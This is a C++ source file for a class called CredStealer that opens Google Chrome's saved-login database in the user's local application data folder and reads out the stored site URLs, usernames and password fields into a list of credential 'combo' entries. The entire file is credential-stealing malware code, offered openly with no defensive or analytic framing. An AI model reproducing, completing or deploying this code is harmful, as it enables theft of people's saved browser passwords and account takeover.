#include <iostream>
#include <stdlib.h>
#include <vector>
#include "CredStealer.h"

static int callback (void *data, int argc, char **argv, char **azColName)
{
    int i;
    std::vector<ComboEntry> *userCreds = static_cast<std::vector<ComboEntry>*> (data);
    ComboEntry newEntry;
    for (i=0; i<argc; i++)
    {
	if (i == 0)
	{
	    newEntry.setDomain(argv[i]);
	}
	else if (i == 1)
	{
	    newEntry.setUsername(argv[i]);
	}
	else if (i == 2)
	{
	    newEntry.setPassword(argv[i]);
	}
    }
    userCreds->push_back(newEntry);
    return 0;
}


void CredStealer::setEntry(ComboEntry newEntry)
{
    entry = newEntry;
}

ComboEntry CredStealer::getEntry()
{
    return entry;
}

std::vector<ComboEntry> CredStealer::readChromePasswords()
{
    std::vector<ComboEntry> results;
    sqlite3 *db;
    char *zErrMsg = 0;
    int rc;
    const char *sql;
    const char *data = "Callback called";
    std::string database = std::getenv("LOCALAPPDATA");
    database += "\\Google\\Chrome\\User Data\\Default\\Login Data";

    rc = sqlite3_open(database.data(), &db);
    if (rc)
    {
	    return results;
    }
    
    sql = "SELECT action_url, username_value, password_value FROM LOGINS";
    rc = sqlite3_exec(db, sql, callback, static_cast<void*>(&results), &zErrMsg);

    if (rc != SQLITE_OK)
    {
	    return results;
    }

    sqlite3_close(db);
    return results;
}

